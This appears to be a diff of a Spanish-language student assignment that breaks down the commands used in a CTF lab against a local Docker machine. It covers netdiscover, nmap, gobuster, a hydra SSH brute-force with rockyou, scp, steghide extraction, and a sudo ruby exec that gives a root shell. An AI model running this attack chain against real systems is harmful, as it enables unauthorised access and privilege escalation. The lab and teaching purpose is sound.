@@ -18,19 +18,112 @@
 | ⚡ | **su / sudo** | Su (Switch User) permite cambio completo de identidad, mientras sudo (Superuser Do) otorga ejecución temporal con privilegios elevados. Sudo implementa el principio de menor privilegio con políticas granulares definidas en /etc/sudoers, logging completo via syslog y timeouts configurables de sesión[43][46][49]. | Cambio de identidad completa (su) vs ejecución temporal privilegiada (sudo); políticas granulares por usuario/grupo/comando/host; auditoría completa con logging detallado; timeouts de sesión y re-autenticación; soporte para autenticación multifactor (PAM); modo no-interactivo para scripts; delegation de permisos específicos sin acceso root; integración con LDAP/AD para entornos empresariales[51][57][60]. | Escalada de privilegios en post-explotación y pentesting; administración segura de sistemas multiusuario críticos; implementación de principio de menor privilegio en SOC; auditorías de actividades administrativas para compliance; automatización de tareas que requieren privilegios elevados; gestión de accesos temporales en entornos DevOps; troubleshooting con permisos controlados; trazabilidad completa para forensics[54]. | `sudo -u apache cat /var/log/httpd/error_log` (comando como usuario específico), `sudo -s` vs `su -` (shell privilegiada temporal vs cambio completo), `sudo visudo` (edición segura de políticas sudoers), `sudo -l -U username` (auditar permisos de usuario), `echo 'password' | sudo -S systemctl restart nginx` (modo no-interactivo para scripts) |
 
 # :two: Explicar en detalle cada uno de los comandos empleados en el anterior CTF; realizando un desglose del mismo y citando al menos tres alternativas (si aplica) de variantes del comando para las herramientas empleadas, este punto amplia el ejercicio anterior.
+## a) netdiscover – Descubrimiento de Hosts en Red Local
+
+| **Aspecto** | **Detalle** |
+|-------------|-------------|
+| **Comando usado** | `sudo netdiscover -i docker0 -r 172.17.0.0/24` |
+| **Propósito** | Descubre hosts activos mediante requests ARP en la red Docker |
+| **Salida esperada** | `````` |
+
+| **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
+|---------------------|-------------------|--------------------|
+| `netdiscover -p -i docker0` | Modo pasivo (solo escucha ARP) | Monitoreo stealth sin enviar paquetes |
+| `netdiscover -f -r 172.17.0.0/24` | Modo rápido con escaneo acelerado | Escaneo veloz para redes grandes |
+| `netdiscover -P -r 172.17.0.0/24` | Salida parseable para scripts | Automatización e integración |
+
+---
+
+## b) nmap – Escaneo Avanzado de Puertos y Servicios
+
+| **Aspecto** | **Detalle** |
+|-------------|-------------|
+| **Comando usado** | `sudo nmap --min-rate 5,000 -p- -sS -sV 172.17.0.2` |
+| **Propósito** | Escaneo SYN stealth de todos los puertos TCP con detección de versiones |
+| **Salida esperada** | `````` |
+
+| **Alternativas avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
+|---------------------------|-------------------|--------------------|
+| `nmap -A -T4 172.17.0.2` | Escaneo agresivo (OS + scripts + traceroute) | `OS: Linux 5.4.0-91-generic` |
+| `nmap -sU --top-ports 1,000 172.17.0.2` | Escaneo UDP de puertos más comunes | `161/udp open snmp` |
+| `nmap --script vuln 172.17.0.2` | Detección de vulnerabilidades con NSE | `CVE-2014-6271 (Shellshock) detected` |
+
+---
+
+## c) gobuster – Enumeración de Directorios Web
+
+| **Aspecto** | **Detalle** |
+|-------------|-------------|
+| **Comando usado** | `gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` |
+| **Propósito** | Fuerza bruta de directorios ocultos usando wordlist de 220,560 entradas |
+| **Salida esperada** | `````` |
+
+| **Variantes útiles** | **Funcionalidad** | **Ejemplo de uso** |
+|---------------------|-------------------|--------------------|
+| `-x php,html,js,txt` | Busca archivos con extensiones específicas | `/admin.php (Status: 200)` |
+| `-t 50 -q` | 50 hilos en modo silencioso | Mayor velocidad sin output verbose |
+| `-r -k` | Seguir redirects, ignorar SSL | `/secure/ -> /login.php` |
+
+---
+
+## d) hydra – Ataque de Fuerza Bruta SSH
+
+| **Aspecto** | **Detalle** |
+|-------------|-------------|
+| **Comando usado** | `hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10` |
+| **Propósito** | Ataque de diccionario contra SSH |
+| **Salida esperada** | `````` |
+
+| **Variantes avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
+|------------------------|-------------------|--------------------|
+| `-L users.txt -P passwords.txt` | Lista de usuarios y contraseñas | Ataque masivo con credenciales corporativas |
+| `-s 2222` | Puerto SSH personalizado | `[2222][ssh] host: 172.17.0.2 login: admin password: 123456` |
+| `-C combo.txt -o results.txt` | Formato combinado usuario:password | Salida guardada en `results.txt` |
+
+---
+
+## e) scp – Transferencia Segura de Archivos
+
+| **Aspecto** | **Detalle** |
+|-------------|-------------|
+| **Comando usado** | `scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor` |
+| **Propósito** | Descarga cifrada de archivo remoto |
+| **Salida esperada** | `````` |
+
+| **Opciones avanzadas** | **Funcionalidad** | **Ejemplo de uso** |
+|-----------------------|-------------------|--------------------|
+| `-r -C` | Recursivo con compresión | Backup completo de directorios |
+| `-P 2222 -i ~/.ssh/key.pem` | Puerto y clave específica | Transferencia a puerto 2222 |
+| `-v` | Modo verbose para debugging | `debug1: Authentication succeeded` |
+
+---
+
+## f) steghide – Análisis de Esteganografía
+
+| **Aspecto** | **Detalle** |
+|-------------|-------------|
+| **Comando usado** | `steghide --extract -sf imagen.jpg` |
+| **Propósito** | Extrae datos ocultos en JPEG |
+| **Salida esperada** | `````` |
+
+| **Comandos relacionados** | **Funcionalidad** | **Ejemplo de uso** |
+|--------------------------|-------------------|--------------------|
+| `--info imagen.jpg` | Consulta metadatos de esteganografía | Informa tamaño y algoritmo |
+| `--embed -ef datos.txt -cf imagen.jpg -p clave` | Oculta datos con contraseña | Esteganografía ofensiva |
+| `--extract -sf imagen.jpg -xf output.txt` | Extrae a archivo específico | Output en `output.txt` |
+
+---
+
+## g) Escalada de Privilegios (su / sudo)
+
+| **Comando** | **Propósito** | **Salida esperada** |
+|-------------|---------------|--------------------|
+| `echo "ZXNsYWNhc2FkZXBpbnlwb24=" \| base64 -d` | Decodifica Base64 | `eslacasadepinypon` |
+| `su oscar` | Cambio a usuario `oscar` | `oscar@amor:~$` |
+| `sudo -l` | Lista permisos sudo | `NOPASSWD: /usr/bin/ruby` |
+| `sudo /usr/bin/ruby -e 'exec "/bin/bash"'` | Shell root vía Ruby | `root@amor:~#` |
 
 # :three: Realice un diagrama de flujo de todo el procedimiento realizado.
 
-
-| Herramienta | Definición | Funcionalidad | Casos de uso relevantes |
-|-------------|-----------|--------------|-------------------------|
-| **Docker** | Plataforma open-source de contenedores que aísla aplicaciones y sus dependencias | Empaqueta software en contenedores portátiles y reproducibles | Desarrollo ágil, despliegue continuo, pruebas consistentes |
-| **Nmap** | Utilidad de escaneo de red y auditoría de seguridad | Detecta puertos, servicios, versiones y SO | Inventario de red, evaluación de vulnerabilidades, verificación de servicios |
-| **Hydra** | Cracker de contraseñas rápido para múltiples protocolos | Ejecuta ataques de fuerza bruta automatizados en servicios remotos | Pentesting de autenticaciones SSH, FTP, HTTP, etc. |
-| **netdiscover** | Escáner ARP activo/pasivo | Descubre hosts activos y sus direcciones MAC en la LAN | Reconocimiento rápido de dispositivos desconocidos en redes locales |
-| **gobuster** | Herramienta de fuerza bruta para directorios y archivos web | Encuentra rutas/archivos ocultos usando diccionarios | Fuzzing de aplicaciones web, enumeración de infraestructura |
-| **scp** | Protocolo seguro de copia de archivos sobre SSH | Transfiere archivos cifrados entre hosts locales/remotos | Respaldos, transferencia de evidencias forenses, despliegues seguros |
-| **steghide** | Utilidad de esteganografía para imágenes/audio | Inserta o extrae datos ocultos dentro de archivos portadores | Análisis forense, ocultamiento legítimo de información sensible |
-| **su / sudo** | Comandos de cambio de usuario y elevación de privilegios | Ejecuta órdenes como otro usuario o como root | Administración del sistema, escalada controlada de privilegios |
 
 
